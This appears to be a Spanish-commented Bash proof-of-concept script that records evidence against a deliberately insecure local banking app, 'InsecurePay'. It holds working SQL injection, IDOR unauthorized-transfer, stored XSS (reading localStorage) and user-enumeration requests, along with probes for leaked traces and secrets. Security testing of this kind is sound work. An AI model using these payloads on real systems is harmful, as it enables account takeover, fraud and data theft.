#!/usr/bin/env bash
# ==============================================================================
# InsecurePay - Script de Pruebas de Concepto (DAST) para la Bitacora Pericial
# Uso: ./docs/poc/ejecutar_poc.sh <directorio_salida> [password_carlos]
# Requiere el backend escuchando en http://localhost:8080
# ==============================================================================
set -u

OUT="${1:-docs/evidencias/salida}"
PASS_CARLOS="${2:-carlos123}"
API="http://localhost:8080"
mkdir -p "$OUT"

# Recorta respuestas muy largas (stack traces) para que la evidencia sea legible
recortar() { cut -c1-600 | head -n 40; }

seccion() { echo; echo "### $1"; echo "\$ $2"; echo; }

login() {
  curl -s -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
       -d "{\"username\":\"$1\",\"password\":\"$2\"}"
}

TOKEN_CARLOS=$(login carlos_mora "$PASS_CARLOS" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

# ---------------------------------------------------------------- HALLAZGO-01
{
  echo "# HALLAZGO-01 - SQL Injection en /api/transacciones/buscar"
  echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
  seccion "Busqueda legitima (termino=alquiler)" \
    "curl -G $API/api/transacciones/buscar --data-urlencode \"termino=alquiler\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i -G "$API/api/transacciones/buscar" --data-urlencode "termino=alquiler" \
       -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
  seccion "Payload tautologico (termino=' OR 1=1 --)" \
    "curl -G $API/api/transacciones/buscar --data-urlencode \"termino=' OR 1=1 --\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i -G "$API/api/transacciones/buscar" --data-urlencode "termino=' OR 1=1 --" \
       -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
} > "$OUT/hallazgo01_sqli.txt" 2>&1

# ---------------------------------------------------------------- HALLAZGO-02
{
  echo "# HALLAZGO-02 - IDOR/BOLA en consulta de cuentas, saldo y transferencias"
  echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
  echo "Atacante: carlos_mora (propietario de la cuenta ID 2). Victima: maria_rojas (cuenta ID 3)."
  seccion "Consulta de cuenta ajena (ID 3) con token de Carlos" \
    "curl -i $API/api/cuentas/3 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i "$API/api/cuentas/3" -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
  seccion "Consulta de saldo ajeno (ID 3) con token de Carlos" \
    "curl -i $API/api/cuentas/3/saldo -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i "$API/api/cuentas/3/saldo" -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
  seccion "Consulta sin token (ID 3)" "curl -i $API/api/cuentas/3"
  curl -s -i "$API/api/cuentas/3" | recortar
  seccion "Transferencia DESDE la cuenta de Maria (ID 3) HACIA la cuenta de Carlos" \
    "curl -i -X POST $API/api/transacciones/transferir -H \"Authorization: Bearer <TOKEN_CARLOS>\" -H \"Content-Type: application/json\" -d '{\"cuentaOrigenId\":3,\"numeroCuentaDestino\":\"CR05015202001026458901\",\"monto\":100000,\"conceptoHtml\":\"Retiro no autorizado\"}'"
  curl -s -i -X POST "$API/api/transacciones/transferir" \
       -H "Authorization: Bearer $TOKEN_CARLOS" -H "Content-Type: application/json" \
       -d '{"cuentaOrigenId":3,"numeroCuentaDestino":"CR05015202001026458901","monto":100000,"conceptoHtml":"Retiro no autorizado"}' | recortar
} > "$OUT/hallazgo02_idor.txt" 2>&1

# ---------------------------------------------------------------- HALLAZGO-03
{
  echo "# HALLAZGO-03 - Stored XSS en concepto de transferencia"
  echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
  # Acceso por propiedad (sin comillas) para que el JavaScript sea valido dentro del atributo onerror
  PAYLOAD='Pago de Servicios <img src=\"x\" onerror=\"alert(localStorage.insecure_pay_user)\">'
  seccion "Transferencia legitima de Carlos (cuenta 2) con payload XSS en el concepto" \
    "curl -i -X POST $API/api/transacciones/transferir -H \"Authorization: Bearer <TOKEN_CARLOS>\" -H \"Content-Type: application/json\" -d '{\"cuentaOrigenId\":2,\"numeroCuentaDestino\":\"CR05015202001026458902\",\"monto\":1000,\"conceptoHtml\":\"$PAYLOAD\"}'"
  curl -s -i -X POST "$API/api/transacciones/transferir" \
       -H "Authorization: Bearer $TOKEN_CARLOS" -H "Content-Type: application/json" \
       -d "{\"cuentaOrigenId\":2,\"numeroCuentaDestino\":\"CR05015202001026458902\",\"monto\":1000,\"conceptoHtml\":\"$PAYLOAD\"}" | recortar
} > "$OUT/hallazgo03_xss.txt" 2>&1

# ---------------------------------------------------------------- HALLAZGO-04
{
  echo "# HALLAZGO-04 - Credenciales en texto plano / enumeracion de usuarios"
  echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
  seccion "Contrasenas almacenadas en el script de inicializacion" \
    "grep -n \"INSERT INTO USUARIOS\" -A 6 backend/src/main/resources/data.sql"
  grep -n "INSERT INTO USUARIOS" -A 6 backend/src/main/resources/data.sql
  seccion "Login valido (carlos_mora)" \
    "curl -i -X POST $API/api/auth/login -H \"Content-Type: application/json\" -d '{\"username\":\"carlos_mora\",\"password\":\"$PASS_CARLOS\"}'"
  curl -s -i -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
       -d "{\"username\":\"carlos_mora\",\"password\":\"$PASS_CARLOS\"}" | recortar
  seccion "Login con contrasena incorrecta" \
    "curl -i -X POST $API/api/auth/login -H \"Content-Type: application/json\" -d '{\"username\":\"carlos_mora\",\"password\":\"incorrecta\"}'"
  curl -s -i -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
       -d '{"username":"carlos_mora","password":"incorrecta"}' | recortar
  seccion "Login con usuario inexistente (enumeracion)" \
    "curl -i -X POST $API/api/auth/login -H \"Content-Type: application/json\" -d '{\"username\":\"no_existe\",\"password\":\"x\"}'"
  curl -s -i -X POST "$API/api/auth/login" -H "Content-Type: application/json" \
       -d '{"username":"no_existe","password":"x"}' | recortar
} > "$OUT/hallazgo04_credenciales.txt" 2>&1

# ---------------------------------------------------------------- HALLAZGO-05
{
  echo "# HALLAZGO-05 - Fuga de trazas tecnicas y configuracion insegura"
  echo "Fecha de ejecucion: $(date '+%Y-%m-%d %H:%M:%S')"
  seccion "Error de sintaxis SQL provocado (termino=')" \
    "curl -i -G $API/api/transacciones/buscar --data-urlencode \"termino='\" -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i -G "$API/api/transacciones/buscar" --data-urlencode "termino='" \
       -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
  seccion "Recurso inexistente (cuenta 999)" \
    "curl -i $API/api/cuentas/999 -H \"Authorization: Bearer <TOKEN_CARLOS>\""
  curl -s -i "$API/api/cuentas/999" -H "Authorization: Bearer $TOKEN_CARLOS" | recortar
  seccion "Consola H2 expuesta" "curl -s -o /dev/null -w '%{http_code}' $API/h2-console/"
  echo "HTTP $(curl -s -o /dev/null -w '%{http_code}' "$API/h2-console/")"
  seccion "Secreto JWT en el repositorio" \
    "grep -n -i \"jwt\" backend/src/main/resources/application.properties"
  grep -n -i "jwt" backend/src/main/resources/application.properties
} > "$OUT/hallazgo05_fuga_trazas.txt" 2>&1

echo "Evidencias generadas en: $OUT"
ls -1 "$OUT"
